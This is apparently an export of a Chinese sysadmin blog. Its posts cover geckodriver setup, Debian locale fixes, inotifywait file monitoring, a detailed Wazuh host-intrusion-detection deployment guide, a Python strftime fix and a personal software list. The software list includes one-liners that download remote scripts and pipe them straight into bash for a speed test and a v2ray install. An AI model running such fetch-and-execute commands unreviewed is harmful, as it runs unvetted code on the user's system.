    <content type="text"><![CDATA[geckodriver在linux下安装 QQ群：397745473 https://github.com/mozilla/geckodriver/releases 可以直接安装或者使用以下安装脚本安装: https://github.com/jackton1/script_install 12345wget https://github.com/mozilla/geckodriver/releases/download/v0.26.0/geckodriver-v0.26.0-linux64.tar.gztar xf geckodriver-v0.26.0-linux64.tar.gzchmod a+x geckodrivercp -fr geckodriver /usr/local/bin/geckodriver rm -f geckodriver geckodriver-v0.26.0-linux64.tar.gz QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[debian10终端输出中文乱码]]></title>
    <url>%2F2020%2F05%2F19%2F118_debian10%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%2F</url>
    <content type="text"><![CDATA[debian10终端输出中文乱码 QQ群：397745473 debian10终端输出中文乱码 解决办法: 1234$sudo dpkg-reconfigure locales选中en_US.UTF-8zh_CN.UTF-8 下一步选 en_US.UTF-8 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux文件监控工具]]></title>
    <url>%2F2020%2F05%2F13%2F116_linux%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[linux文件监控工具 inotifywait命令 1234567891011121314151617Inotify一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。。inotify-tools是一个C库和一组命令行的工作提供Linux下inotify的简单接口。inotify-tools安装后会得到inotifywait和inotifywatch这两条命令：inotifywait命令可以用来收集有关文件访问信息，Linux发行版一般没有包括这个命令，需要安装inotify-tools，这个命令还需要将inotify支持编译入Linux内核，好在大多数Linux发行版都在内核中启用了inotify。inotifywatch命令用于收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。开始之前需要检测系统内核是否支持inotify：使用uname -r命令检查Linux内核，如果低于2.6.13，就需要重新编译内核加入inotify的支持。使用ll /proc/sys/fs/inotify命令，是否有以下三条信息输出，如果没有表示不支持。ll /proc/sys/fs/inotifytotal 0-rw-r--r-- 1 root root 0 Jan 4 15:41 max_queued_events-rw-r--r-- 1 root root 0 Jan 4 15:41 max_user_instances-rw-r--r-- 1 root root 0 Jan 4 15:41 max_user_watches QQ群：397745473 安装inotify-tools123456789inotify-tools项目地址：https://github.com/rvoicilas/inotify-toolsinotify-tools下载地址：http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz#CentOS release 5.8/64位：tar zxvf inotify-tools-3.14.tar.gzcd inotify-tools-3.14./configuremakemake install其他Linux发行版安装方法可以参见：https://github.com/rvoicilas/inotify-tools/wiki#wiki-getting inotify相关参数inotify定义了下列的接口参数，可以用来限制inotify消耗kernel memory的大小。由于这些参数都是内存参数，因此，可以根据应用需求，实时的调节其大小： /proc/sys/fs/inotify/max_queued_evnets表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。 /proc/sys/fs/inotify/max_user_instances表示每一个real user id可创建的inotify instatnces的数量上限。 /proc/sys/fs/inotify/max_user_watches表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。 根据以上在32位或者64位系统都可以执行： 12echo 104857600 &gt; /proc/sys/fs/inotify/max_user_watchesecho &apos;echo 104857600 &gt; /proc/sys/fs/inotify/max_user_watches&apos; &gt;&gt; /etc/rc.local 如果遇到以下错误： 1234inotifywait: error while loading shared libraries: libinotifytools.so.0: cannot open shared object file: No such file or directory解决方法：32位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib/libinotifytools.so.064位系统：ln -s /usr/local/lib/libinotifytools.so.0 /usr/lib64/libinotifytools.so.0 inotifywait命令使用1234567891011121314151617181920212223#!/bin/bash#filename watchdir.shpath=$1/usr/local/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y/%H:%M&apos; --format &apos;%T %w %f&apos; -e modify,delete,create,attrib $path执行输出：./watchdir.sh /data/wsdata/tools/04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swx04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp04/01/13/16:34 /data/wsdata/tools/ .j.jsp.swp04/01/13/16:35 /data/wsdata/tools/ 491304/01/13/16:35 /data/wsdata/tools/ 491304/01/13/16:35 /data/wsdata/tools/ 491304/01/13/16:35 /data/wsdata/tools/ j.jsp04/01/13/16:35 /data/wsdata/tools/ j.jsp04/01/13/16:35 /data/wsdata/tools/ j.jsp04/01/13/16:35 /data/wsdata/tools/ j.jsp~04/01/13/16:35 /data/wsdata/tools/ .j.jsp.swp inotifywait命令参数 -m是要持续监视变化。 -r使用递归形式监视目录。 -q减少冗余信息，只打印出需要的信息。 -e指定要监视的事件列表。 --timefmt是指定时间的输出格式。 --format指定文件变化的详细信息。 可监听的事件 事件 描述 access 访问，读取文件。 modify 修改，文件内容被修改。 attrib 属性，文件元数据被修改。 move 移动，对文件进行移动操作。 create 创建，生成新文件 open 打开，对文件进行打开操作。 close 关闭，对文件进行关闭操作。 delete 删除，文件被删除。 参考:https://man.linuxde.net/inotifywait QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hids之wazuh部署入门]]></title>
    <url>%2F2020%2F05%2F01%2F121_hids%E4%B9%8Bwazuh%E9%83%A8%E7%BD%B2%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[hids之wazuh部署入门 QQ群：397745473 1参考: http://www.vuleyes.com/2018/02/02/hids之wazuh部署入门/ Wazuh官网 Wazuh，一款以ossec作为引擎的主机入侵检测系统。通过与ELK的结合，便于管理员通过日志平台查看系统日志信息、告警信息、规则配置信息等。 部署wazuh从Github下载wazuh 1git clone https://github.com/wazuh/ossec-wazuh.git 123# ./install.sh选择server或者agent即可 安全完后，启动服务端 1service wazuh-manager start 查看server端状态 service wazuh-manager status 12345678ossec-monitord is running...ossec-logcollector is running...ossec-remoted is running...ossec-syscheckd is running...ossec-analysisd is running...ossec-maild is running...ossec-execd is running...wazuh-modulesd is running... 查看agent端状态 12345ossec-logcollector is running...ossec-syscheckd is running...ossec-agentd is running...ossec-execd is running...wazuh-modulesd not running... wazuh-modulesd not running… 是正常现象，只有服务端是running 调server接口，添加agent(注意：这里必须先添加agent，再启动agent服务。 否则会出现Queue not accessible等问题)： 123curl -u foo:bar -k -X POST -d &apos;name=HOSTNAME&amp;ip=xx.xx.xx.xx&apos; http://Wazuh-api:55000/agentscurl -u foo:bar -k -X GET https://API_IP:55000/agents/001/keyossec/bin/manage_agents -i AGENTKEY 启动客户端(代理端) 1service wazuh-agent start FAQ: 123456Q1： 报错 - ERROR: Queue &apos;/var/ossec/queue/ossec/queue&apos; not accessibleA: 不用折腾，先把agent添加进server，再开启服务试试。Q2： 如果一台机器先装server再装成agent，使用bin/manage_agents仍然为服务端的脚本A: 不纠结，传一个agent的manage_agents脚本上去 Wazuh api部署依赖nodejs环境 123cd /etc/osseccurl -s -o install_api.sh https://raw.githubusercontent.com/wazuh/wazuh-api/v2.1.0/install_api.sh &amp;&amp; bash ./install_api.sh downloadservice wazuh-api start 判断是否成功启动api，可查看本地端口55000 安全配置接口账号密码，执行 api/configuration/auth 下 12node htpasswd user USERNAMEservice wazuh-api restart wazuh-api启动失败，Centos解决方法 参考 123yum install centos-release-sclyum install python27service wazuh-api restart ELK Stack部署ELK Stack是wazuh组件之一，主要收集ossec产生的告警信息。 ELK搭建参考 搭建elk完毕后，导入es模板 12curl https://raw.githubusercontent.com/wazuh/wazuh-kibana-app/2.1/server/startup/integration_files/template_file.json | curl -XPUT -u kibana:kibana &apos;http://localhost:9200/_template/wazuh&apos; -H &apos;Content-Type: application/json&apos; -d @-curl https://raw.githubusercontent.com/wazuh/wazuh-kibana-app/2.1/server/startup/integration_files/alert_sample.json | curl -XPUT -u kibana:kibana &quot;http://localhost:9200/wazuh-alerts-&quot;`date +%Y.%m.%d`&quot;/wazuh/sample&quot; -H &apos;Content-Type: application/json&apos; -d @- 下载logstash配置 12curl -so /elkb/logstash-5.5.1/config/01-wazuh.conf https://raw.githubusercontent.com/wazuh/wazuh/2.1/extensions/logstash/01-wazuh.confcurl -so /elkb/logstash-5.5.1/wazuh-elastic5-template.json https://raw.githubusercontent.com/wazuh/wazuh/2.1/extensions/elasticsearch/wazuh-elastic5-template.json 安装kibana插件(版本对应不上，需要自己修改packages.js) 1bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp.zip openscap部署openscap是ossec的其中一个组件，主要功能是提供基线扫描(openscap仅支持linux的机器) 1yum install openscap-scanner scap-security-guide 默认配置中，openscap是不开放的。需要修改配置文件ossec.conf中标签启动openscap。 Wazuh相关配置Wazuh Server端配置Remote ServiceWazuh Manager发布远程服务与agent通信 ossec.conf中配置参考: Remote Service 12345&lt;ossec_config&gt; &lt;remote&gt; &lt;local_ip&gt;10.0.0.10&lt;/local_ip&gt; &lt;/remote&gt;&lt;/ossec_config&gt; 定义告警阈值ossec.conf中配置参考: Alert 设置级别在6以上的告警会被记录在alert.json中 12345&lt;ossec_config&gt; &lt;alerts&gt; &lt;log_alert_level&gt;6&lt;/log_alert_level&gt; &lt;/alerts&gt;&lt;/ossec_config&gt; Integration with external APIs (仅支持PagerDuty、slack)Wazuh提供额外的API接口，默认没开启Integration 12$ /var/ossec/bin/ossec-control enable integrator$ /var/ossec/bin/ossec-control restart 在ossec.conf中配置相应hook_url 123456789101112&lt;integration&gt; &lt;name&gt; &lt;/name&gt; &lt;hook_url&gt; &lt;/hook_url&gt; &lt;api_key&gt; &lt;/api_key&gt; &lt;!-- Optional filters --&gt; &lt;rule_id&gt; &lt;/rule_id&gt; &lt;level&gt; &lt;/level&gt; &lt;group&gt; &lt;/group&gt; &lt;event_location&gt; &lt;/event_location&gt;&lt;/integration&gt; 配置syslog output配置syslog输出(全部级别alert发送到240，高于级别9的alert发送到241) 12345678910&lt;ossec_config&gt; &lt;syslog_output&gt; &lt;level&gt;9&lt;/level&gt; &lt;server&gt;192.168.1.241&lt;/server&gt; &lt;/syslog_output&gt; &lt;syslog_output&gt; &lt;server&gt;192.168.1.240&lt;/server&gt; &lt;/syslog_output&gt;&lt;/ossec_config&gt; syslog output参考 配置完后必须要启用client-syslog 1/ops/ossec/bin/ossec-control enable client-syslog 配置自动生成报告报告参考 配置email 配置每日发送syscheck的告警情况 1234567&lt;ossec_config&gt; &lt;reports&gt; &lt;category&gt;syscheck&lt;/category&gt; &lt;title&gt;Daily report: File changes&lt;/title&gt; &lt;email_to&gt;example@test.com&lt;/email_to&gt; &lt;/reports&gt;&lt;/ossec_config&gt; 配置每日发送告警级别高于10的情况 1234567&lt;ossec_config&gt; &lt;reports&gt; &lt;level&gt;10&lt;/level&gt; &lt;title&gt;Daily report: Alerts with level higher than 10&lt;/title&gt; &lt;email_to&gt;example@test.com&lt;/email_to&gt; &lt;/reports&gt;&lt;/ossec_config&gt; Wazuh Agent端配置注册agent使用Wazuh API Step 1: 添加agent 12$ curl -u foo:bar -k -X POST -d &apos;name=NewAgent&amp;ip=10.0.0.8&apos; https://API_IP:55000/agents&#123;&quot;error&quot;:0,&quot;data&quot;:&quot;001&quot;&#125; Step 2: 获取agent key 12$ curl -u foo:bar -k -X GET https://API_IP:55000/agents/001/key&#123;&quot;error&quot;:0,&quot;data&quot;:&quot;MDAxIE5ld0FnZW50IDEwLjAuMC44IDM0MGQ1NjNkODQyNjcxMWIyYzUzZTE1MGIzYjEyYWVlMTU1ODgxMzVhNDE3MWQ1Y2IzZDY4M2Y0YjA0ZWVjYzM=&quot;&#125; Step 3: agent导入key 1/var/ossec/bin/manage_agents -i MDAxIE5ld0FnZW50IDEwLjAuMC44IDM0MGQ1NjNkODQyNjcxMWIyYzUzZTE1MGIzYjEyYWVlMTU1ODgxMzVhNDE3MWQ1Y2IzZDY4M2Y0YjA0ZWVjYzM= Step 4: agent重启 1$ /var/ossec/bin/ossec-control restart 删除agent123$ curl -u foo:bar -k -X DELETE http://127.0.0.1:55000/agents/002&#123;&quot;error&quot;:0,&quot;data&quot;:&quot;Agent removed&quot;&#125; 查询agent连接情况agent段ossec.conf配置10.0.0.10为服务端，client参考 123456&lt;ossec_config&gt; &lt;client&gt; &lt;server-ip&gt;10.0.0.10&lt;/server-ip&gt; &lt;protocol&gt;udp&lt;/protocol&gt; &lt;/client&gt;&lt;/ossec_config&gt; server端查询活动agent情况 1$ /ops/ossec/bin/agent_control -lc Wazuh组件功能Log data collection (Logcollector组件)运行周期： 实时 本模块提供日志数据采集的功能 日志数据采集源有3种： log文件 Windows event log 远程syslog 日志采集标签： localfile remote global 可使用正则匹配日志文件名，如： 1234&lt;localfile&gt; &lt;location&gt;/var/log/*.log&lt;/location&gt; &lt;log_format&gt;syslog&lt;/log_format&gt;&lt;/localfile&gt; File integrity monitoring (Syscheckd组件)默认运行周期： 6h 本模块提供监控文件变换的功能 Syscheckd参考 基础用法，验证文件md5, sha1, owner, permissions 1234&lt;syscheck&gt; &lt;directories check_all=&quot;yes&quot;&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt; &lt;directories check_all=&quot;yes&quot;&gt;/root/users.txt,/bsd,/root/db.html&lt;/directories&gt;&lt;/syscheck&gt; 周期监控文件 123&lt;syscheck&gt; &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot;&gt;c:/tmp&lt;/directories&gt;&lt;/syscheck&gt; 实时监控文件 123&lt;syscheck&gt; &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot; report_changes=&quot;yes&quot;&gt;/test&lt;/directories&gt;&lt;/syscheck&gt; Anomaly and malware detection (Rootcheck组件)默认运行周期：2h 本模块根据系统活动匹配设定的规则或指纹识别出异常 rootcheck参考 配置rootkit库 1234&lt;rootcheck&gt; &lt;rootkit_files&gt;/var/ossec/etc/shared/rootkit_files.txt&lt;/rootkit_files&gt; &lt;rootkit_trojans&gt;/var/ossec/etc/shared/rootkit_trojans.txt&lt;/rootkit_trojans&gt;&lt;/rootcheck&gt; Monitoring security policies (Rootcheck组件、OpenSCAP)本模块根据提前定义好的策略周期扫描系统，判断系统是否符合安全策略 配置审计策略 12345&lt;rootcheck&gt; &lt;system_audit&gt;./db/system_audit_rcl.txt&lt;/system_audit&gt; &lt;system_audit&gt;./db/cis_debian_linux_rcl.txt&lt;/system_audit&gt; &lt;system_audit&gt;./db/cis_rhel_linux_rcl.txt&lt;/system_audit&gt;&lt;/rootcheck&gt; 周期扫描策略 1234567&lt;rootcheck&gt; &lt;frequency&gt;36000&lt;/frequency&gt; &lt;system_audit&gt;/var/ossec/etc/shared/system_audit_rcl.txt&lt;/system_audit&gt; &lt;system_audit&gt;/var/ossec/etc/shared/cis_debian_linux_rcl.txt&lt;/system_audit&gt; &lt;system_audit&gt;/var/ossec/etc/shared/cis_rhel_linux_rcl.txt&lt;/system_audit&gt; &lt;system_audit&gt;/var/ossec/etc/shared/cis_rhel5_linux_rcl.txt&lt;/system_audit&gt; &lt;/rootcheck&gt; 自定义rootcheck策略 创建audit文件 1234567# PermitRootLogin not allowed# PermitRootLogin indicates if the root user can log in by ssh.$sshd_file=/etc/ssh/sshd_config;[SSH Configuration - 1: Root can log in] [any] [1]f:$sshd_file -&gt; !r:^# &amp;&amp; r:PermitRootLogin\.+yes;f:$sshd_file -&gt; r:^#\s*PermitRootLogin; 在rootcheck标签中添加audit文件 123&lt;rootcheck&gt; &lt;system_audit&gt;/var/ossec/etc/shared/audit_test.txt&lt;/system_audit&gt;&lt;/rootcheck&gt; OpenSCAP组件rpm安装OpenSCAP yum install openscap-scanner Wazuh默认配置文件在目录 /ops/ossec/wodles/oscap/ 每个agent选择对应的系统版本将配置文件放在 /ops/ossec/wodles/oscap/policies 中 wazuh中openscap默认运行周期： 30m 1234567891011&lt;wodle name=&quot;open-scap&quot;&gt; &lt;disabled&gt;no&lt;/disabled&gt; &lt;timeout&gt;1800&lt;/timeout&gt; &lt;interval&gt;1d&lt;/interval&gt; &lt;scan-on-start&gt;yes&lt;/scan-on-start&gt; &lt;content type=&quot;xccdf&quot; path=&quot;ssg-centos-7-ds.xml&quot;&gt; &lt;profile&gt;xccdf_org.ssgproject.content_profile_pci-dss&lt;/profile&gt; &lt;profile&gt;xccdf_org.ssgproject.content_profile_common&lt;/profile&gt; &lt;/content&gt;&lt;/wodle&gt; wodle标签参考 Monitoring system calls (此模块貌似很强，后续需加强学习)跟踪 Linux Audit system 提供的安全相关的信息 audit参考 若需要使用系统的audit，需要安装 1yum install audit 配置wazuh使用审计功能，在 ossec.conf 添加 1234&lt;localfile&gt; &lt;log_format&gt;audit&lt;/log_format&gt; &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;&lt;/localfile&gt; Command monitoring此模块主要为了应对我们需要监控确没日志输出的任务 Step 1：开启agent远程命令接口, 在agent端local_internal_options.conf文件添加 1logcollector.remote_commands=1 Step 2：在服务端ossec.conf中添加执行tasklist命令 12345&lt;localfile&gt; &lt;log_format&gt;full_command&lt;/log_format&gt; &lt;command&gt;tasklist&lt;/command&gt; &lt;frequency&gt;120&lt;/frequency&gt; &lt;/localfile&gt; Step 3：配置相应触发告警的规则 123456789101112&lt;rule id=&quot;100010&quot; level=&quot;6&quot;&gt; &lt;if_sid&gt;530&lt;/if_sid&gt; &lt;match&gt;^ossec: output: &apos;tasklist&apos;&lt;/match&gt; &lt;description&gt;Important process not running.&lt;/description&gt; &lt;group&gt;process_monitor,&lt;/group&gt;&lt;/rule&gt;&lt;rule id=&quot;100011&quot; level=&quot;0&quot;&gt; &lt;if_sid&gt;100010&lt;/if_sid&gt; &lt;match&gt;notepad.exe&lt;/match&gt; &lt;description&gt;Processes running as expected&lt;/description&gt; &lt;group&gt;process_monitor,&lt;/group&gt;&lt;/rule&gt; 监控端口服务变换，产生告警姿势(默认配置有此规则) Step 1：配置命令netstat 1234&lt;localfile&gt; &lt;log_format&gt;full_command&lt;/log_format&gt; &lt;command&gt;netstat -tan |grep LISTEN|grep -v 127.0.0.1&lt;/command&gt;&lt;/localfile&gt; Step 2：配置相应规则 1234567&lt;rule id=&quot;533&quot; level=&quot;7&quot;&gt; &lt;if_sid&gt;530&lt;/if_sid&gt; &lt;match&gt;ossec: output: &apos;netstat -tan&lt;/match&gt; &lt;check_diff /&gt; &lt;description&gt;Listened ports status (netstat) changed (new port opened or closed).&lt;/description&gt; &lt;group&gt;pci_dss_10.2.7,pci_dss_10.6.1,&lt;/group&gt;&lt;/rule&gt; Active response本组件可根据告警的级别，触发一系列的脚本应对威胁 Step 1：在agent的ossec.conf中配置响应动作脚本 command参考： 123456&lt;command&gt; &lt;name&gt;host‐deny&lt;/name&gt; &lt;executable&gt;host‐deny.sh&lt;/executable&gt; &lt;expect&gt;srcip&lt;/expect&gt; &lt;timeout_allowed&gt;yes&lt;/timeout_allowed&gt;&lt;/command&gt; Step 2：在server中定义rules对告警动作的响应 123456&lt;active‐response&gt; &lt;command&gt;host‐deny&lt;/command&gt; &lt;location&gt;local&lt;/location&gt; &lt;level&gt;7&lt;/level&gt; &lt;timeout&gt;600&lt;/timeout&gt;&lt;/active‐response&gt; 避免影响业务，建议初始化时关闭此标签，在ossec.conf中配置(agent、server) 123&lt;active-response&gt; &lt;disabled&gt;yes&lt;/disabled&gt;&lt;/active-response&gt; 正常关闭后，查看ossec状态： ossec-execd not running... Agentless monitoring此模为了解决不可安装agent又需要加入wazuh体系的设备，如防火墙、路由器、交换机 默认server端是没有开启agentless监控的 开启agentless monitoring 1/var/ossec/bin/ossec-control enable agentless server端通过ssh与agentless的设备连接 执行 /ops/ossec/agentless/register_host.sh list 查看已连接设备 执行 /ops/ossec/agentless/register_host.sh add root@example_address.com example_password [enablepass] 添加设备(公钥认证直接添加相应的public key到对应的设备 sudo -u ossec ssh-keygen) 当设备添加入agentless monitoring list后，需要配置server端去监控它 BSD 系统 1234567&lt;agentless&gt; &lt;type&gt;ssh_integrity_check_bsd&lt;/type&gt; &lt;frequency&gt;20000&lt;/frequency&gt; &lt;host&gt;root@test.com&lt;/host&gt; &lt;state&gt;periodic&lt;/state&gt; &lt;arguments&gt;/bin /var/&lt;/arguments&gt;&lt;/agentless&gt; Linux 系统 1234567&lt;agentless&gt; &lt;type&gt;ssh_integrity_check_linux&lt;/type&gt; &lt;frequency&gt;36000&lt;/frequency&gt; &lt;host&gt;root@test.com&lt;/host&gt; &lt;state&gt;periodic&lt;/state&gt; &lt;arguments&gt;/bin /etc/ /sbin&lt;/arguments&gt;&lt;/agentless&gt; 差异比较 当命令输出结果与上一次不一样时，将产生告警 1234567&lt;agentless&gt; &lt;type&gt;ssh_generic_diff&lt;/type&gt; &lt;frequency&gt;20000&lt;/frequency&gt; &lt;host&gt;root@test.com&lt;/host&gt; &lt;state&gt;periodic_diff&lt;/state&gt; &lt;arguments&gt;ls -la /etc; cat /etc/passwd&lt;/arguments&gt;&lt;/agentless&gt; 抗洪水机制(anti-flooding mechanism)此组件旨在防止代理上的大量突发事件对网络或server端产生不利影响 agent突发事件，导致大量日志产生情况； Systemcheck监控目录、文件变化 应用报错日志无限触发，导致产生大量日志，如磁盘已满 Leaky bucketLeaky bucket是一个控制模型，主要提供4种告警状态，便于分析当前日志缓存的状态 默认buffer长度为5000个事件(每秒发500个事件到server端)，在agent中ossec.conf中标签client_buffer定义 123456&lt;client_buffer&gt; &lt;!-- Agent buffer options --&gt; &lt;disable&gt;no&lt;/disable&gt; &lt;length&gt;5000&lt;/length&gt; &lt;events_per_second&gt;500&lt;/events_per_second&gt; &lt;/client_buffer&gt; 告警级别： Full alert 事件数量达到100%，产生full alert告警 Warning alert 事件数量达到90%，产生warning alert告警 Normal alert 事件数量达到70%，产生normal alert告警 Flood alert 事件超过100%开始，到回归到90%，产生flood alert告警 agent labels此模块主要提供一个自定义agent告警的方式 修改agent中的ossec.conf 1234567&lt;labels&gt; &lt;label key=&quot;aws.instance-id&quot;&gt;i-052a1838c&lt;/label&gt; &lt;label key=&quot;aws.sec-group&quot;&gt;sg-1103&lt;/label&gt; &lt;label key=&quot;network.ip&quot;&gt;172.17.0.0&lt;/label&gt; &lt;label key=&quot;network.mac&quot;&gt;02:42:ac:11:00:02&lt;/label&gt; &lt;label key=&quot;installation&quot; hidden=&quot;yes&quot;&gt;January 1st, 2017&lt;/label&gt;&lt;/labels&gt; 总结 整套Wazuh在启动前，建议关闭联动功能，避免出现未知情况阻断。 规则配置灵活，建议多参考ossec规则自定义适应业务的规则。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python中time.strftime不支持中文]]></title>
    <url>%2F2020%2F05%2F01%2F124_python%E6%97%B6%E9%97%B4%E8%BE%93%E5%87%BA%E5%B9%B4%E6%9C%88%E6%97%A5%E6%A0%BC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[python中time.strftime不支持中文，报错UnicodeEncodeError: ‘locale’ codec can’t encode character ‘\u5e74’ in position 2: encoding error QQ群：397745473 参考原文：https://www.cnblogs.com/feiquan/p/11217534.html 使用time.strftime将 “2020-10-10 10:10:10” 转化为 2020年10月10日10时10分10 报错： 1234import timetimestr=&quot;2020-10-10 10:10:10&quot;t=time.strptime(timestr,&quot;%Y-%m-%d %H:%M:%S&quot;)print(time.strftime(&quot;%Y年%m月%d日 %H时%M分%S秒&quot;,t)) 根据错误可以看出，没有执行成功的原因是”%Y年%m月%d日 %H时%M分%S秒”中包含了中文，中文没有转化为unicode编码失败的。 解决方法： 方法一：先转为uncode编码执行，执行完后转为utf-8显示 1234import timetimestr=&quot;2020-10-10 10:10:10&quot;t=time.strptime(timestr,&quot;%Y-%m-%d %H:%M:%S&quot;)print(time.strftime(&quot;%Y年%m月%d日 %H时%M分%S秒&quot;.encode(&apos;unicode_escape&apos;).decode(&apos;utf8&apos;),t).encode(&apos;utf-8&apos;).decode(&apos;unicode_escape&apos;)) 执行结果： 方法二：修改语言符号 详情 执行结果： 方法三：重写一个自定义转化函数 123456789101112131415161718def change_time(timeStr:str,t_int=False)-&gt;str: import re t_text = ['年', '月', '日 ', '时', '分', '秒'] re_t = re.compile("[\d|\.]+") str_time = '' for k, v in zip(t_text, re_t.findall(timeStr)): if t_int and '.' in v : v=re.sub('\.\d+', '', v) str_time += str(v) + k return str_timeif __name__ == '__main__': print(datetime.now()) t=change_time(str(datetime.now())) int_t=change_time(t,True) float_t=change_time(t) print(int_t) print(float_t) 执行结果： QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的常用软件列表]]></title>
    <url>%2F2020%2F04%2F27%2F58_%E6%88%91%E7%9A%84%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[常用软件列表 必备软件列表 QQ群：397745473 常用软件 软件名称 官方地址 备注 VMware https://my.vmware.com/cn/web/vmware/downloads Typora https://www.typora.io/ v2rayN https://github.com/2dust/v2rayN 文件和打印机共享功能修复工具 http://tools.lenovo.com.cn//api/downloadTool?toolid=351 Q-Dir http://www.q-dir.com/ 文件管理 在线流程图 https://www.draw.io 做图 PE程序 https://www.laomaotao.net/ PE Linux 测速 https://github.com/FunctionClub/ZBench 测速 123456linux 测速脚本wget -qO- bench.sh | bash或curl -Lso- bench.sh | bashgithub:https://github.com/teddysun/across 常用查IP网站 名称 网址 备注 ip8 https://ip8.com/ 国外ip8 ip138 http://ip138.com/ 国内 ipaddress https://www.ipaddress.com/ 国外 必备软件 软件名称 官方地址 说明 Notepad++ https://notepad-plus-plus.org/ 编辑器 PyCharm https://www.jetbrains.com/pycharm/download/ IDE QQ https://im.qq.com/ 聊天工具 微信 https://pc.weixin.qq.com/ 聊天工具 QQ五笔 http://qq.pinyin.cn/index_wubi.php 输入法 KeePass https://keepass.info/ 密码保存工具 火绒 https://www.huorong.cn/ 杀软 Bitvise SSH Client https://www.bitvise.com/download-area SSH连接工具 RDCMan https://www.microsoft.com/en-us/download/details.aspx?id=44989 windows 远程工具[1] Xshell linux 远程工具 linux 远程 MAC OS 常用软件 软件名称 官方地址 说明 chrome https://www.google.cn/intl/zh-CN/chrome/ macqq https://im.qq.com/download/ 红包工具 https://github.com/wwpp3399/MacRe-AutoOpenRedPack (崩溃)https://github.com/AsTryE/QQRedPackHelper 播放器 https://iina.io/ MAC下一款超好用的万能开源播放器IINA LEDE 常规操作 名称 网址 说明 v2ray离线包等 https://github.com/hq450/fancyss_history_package/tree/master/fancyss_X64 lede v2ray https://www.v2ray.com/chapter_00/install.html v2ray-core https://github.com/v2ray/v2ray-core/releases lede 固件 https://firmware.koolshare.cn/ 先下载对应的固件 1234567891011122ray离线包参考:http://www.loonlog.com/2019/7/25/lede-v2ray-off-line/v2ray一键脚本：https://github.com/Jrohy/multi-v2ray一键安装v2ray执行:bash &lt;(curl -s -L https://git.io/v2ray.sh)v2ray 注意事项,以下操作后感觉速度快多了:1.传输协议: mKCP_dynamicPort)2.改默认端口 QQ群：397745473]]></content>
      <categories>
        <category>软件</category>
      </categories>
      <tags>
        <tag>常用软件列表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lxed登陆时提示没有加入netdev组解决办法]]></title>
    <url>%2F2020%2F04%2F03%2F115_lxed%E7%99%BB%E9%99%86%E6%97%B6%E6%8F%90%E7%A4%BA%E6%B2%A1%E6%9C%89%E5%8A%A0%E5%85%A5netdev%E7%BB%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[提示信息: Unable to contact the Wicd daemon due to an access denied error from DBus. Please check that your user is in the netdev group QQ群：397745473 TO find out what groups your user is a member of, open a terminal and type 1groups To add yourself to a group type: 1sudo gpasswd -a &lt;username&gt; netdev 原文:https://ubuntuforums.org/showthread.php?t=1301414 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GoLang常用代码片段]]></title>
    <url>%2F2020%2F01%2F25%2F112_Golang%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%2F</url>
